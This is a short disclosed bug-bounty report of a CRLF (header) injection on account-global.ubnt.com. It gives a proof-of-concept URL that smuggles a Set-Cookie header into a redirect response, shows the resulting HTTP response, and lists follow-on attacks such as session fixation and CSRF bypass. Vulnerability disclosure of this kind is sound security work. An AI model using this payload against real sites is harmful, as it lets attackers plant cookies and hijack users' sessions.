# [account-global.ubnt.com] CRLF Injection

## Report Details
- **Report ID**: 145128
- **URL**: https://hackerone.com/reports/145128
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-06-16T09:52:03.180Z
- **Disclosed**: 2017-03-31T19:36:18.579Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
**PoC** (any browser except FireFox):
`http://account-global.ubnt.com/%3f%0dSet-Cookie:crlf=injection%3bdomain=.ubnt.com%3b`

**HTTP Response**:
```
HTTP/1.1 302 Found
Content-Type: text/html; charset=iso-8859-1
Date: Thu, 16 Jun 2016 09:59:15 GMT
Location: https://account-global.ubnt.com/index.html?         <= injection \r
Set-Cookie:crlf=injection;domain=.ubnt.com;
```

This vulnerability could be used in combination with others. For example, XSS via Cookie, session fixation or bypass Double-Submit Cookie CSRF protection.

## Attachments
No attachments
